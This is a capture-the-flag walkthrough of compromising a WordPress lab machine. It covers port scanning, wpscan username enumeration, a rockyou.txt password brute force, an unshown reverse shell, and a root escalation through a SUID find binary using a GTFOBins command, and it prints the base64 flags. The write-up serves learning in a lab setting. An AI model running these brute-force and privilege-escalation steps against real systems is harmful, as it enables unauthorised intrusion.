100% worth the rewatch after completing this room

I start by visiting the website we see a simple website made by Coldd and we see it’s made by Wordpress

![][image4]

I even start nmap:

![][image5]

***nmap 10.10.83.227***

* This scans the target for open ports and service versions.

Knowing it’s a wordpress we go to /wp-login.php

![][image6]

Now using wpscan

![][image7]

***wpscan — url http://10.10.83.227/ — enumerate u***

* \--url: Specifies the WordPress site URL.  
* \--enumerate u: Attempts to enumerate valid WordPress usernames.

![][image8]

**Output:** reveals 3 users — hugo, c0ldd, and Philip.  
Now we know c0ldd is the person who made the website so using his username let's bruteforce trying to find the password.

![][image9]

***wpscan — url http://10.10.83.227/ — usernames c0ldd — passwords /home/kali/Downloads/rockyou.txt***

* This uses rockyou.txt to brute-force the password for c0ldd

![][image10]

Eventually, we get the password: 9876543210

* Using this credentials we login and see the dashboard

now based on our page we make the changes:

Reverse shell connects back

***python3 \-c ‘import pty; pty.spawn(“/bin/bash”)’***

Now this upgrades to a fully interactive pseudo-terminal

Then going to /home \-\> /c0ldd and trying t read the user.txt, but it shows permission denied

So we try SUID binary enumeration

![][image16]

***find / \\-perm \-4000 2\>/dev/null***

* Searches for all files with SUID bit set (4000 permission).  
* 2\>/dev/null: suppresses permission errors.  
* This command **quickly scans the entire filesystem** for such binaries that can potentially be leveraged to **escalate to root**from a limited shell.

***/usr/bin/find***

This catches our eye

Going to GTFOBins:

## [**https://gtfobins.github.io/gtfobins/find/**](https://gtfobins.github.io/gtfobins/find/)

**![][image17]**

***find . \-exec /bin/sh \\; \-quit***

![][image18]

* \-exec: executes a command for each matching file.  
* /bin/sh \-p: runs a shell with preserved privileges.  
* \-quit: exits after one match to avoid repeating.

This drops us into a **root shell**

Now capturing the flags

![][image19]

***cd /home/c0ldd***  
***cat user.txt***

This gives the user.txt

RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

***cd /root***  
***ls \-la***  
***cat root.txt***

This leads us to the final flag a.k.a the root flag

wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
